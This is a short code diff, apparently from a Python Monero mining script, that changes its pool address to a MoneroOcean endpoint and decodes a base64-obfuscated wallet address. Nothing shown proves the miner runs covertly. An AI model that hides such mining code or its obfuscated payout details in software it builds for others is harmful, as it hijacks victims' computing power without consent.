@@ -22,7 +22,7 @@ WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2Fi
 
 # Ana havuz adresi sabitlendi
 POOLS = [
-    "kukume.net:14242"
+    "gulf.moneroocean.stream:10128"
 ]
 
 def clean_ansi(text):
